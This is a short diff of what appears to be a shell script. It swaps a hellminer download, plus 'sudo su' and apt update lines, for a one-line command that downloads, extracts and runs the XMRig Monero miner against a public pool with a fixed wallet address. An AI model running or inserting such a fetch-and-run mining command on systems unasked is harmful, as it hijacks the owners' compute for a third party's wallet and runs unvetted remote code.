@@ -1,4 +1,1 @@
-sudo su
-sudo apt update -y
-sudo apt upgrade -y
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x *
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar -zxvf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig -o de.monero.herominers.com:1111 -u 86MEa4kJqP3YNmdsAQRrffSg6hznS2YGEAX1NwMeTwZZc4T78DQs3WLhwrYh64qjRh4bGJxqnKuAnAaX5yuk2YyLPTqf4Qb -p x -a rx/0 -k
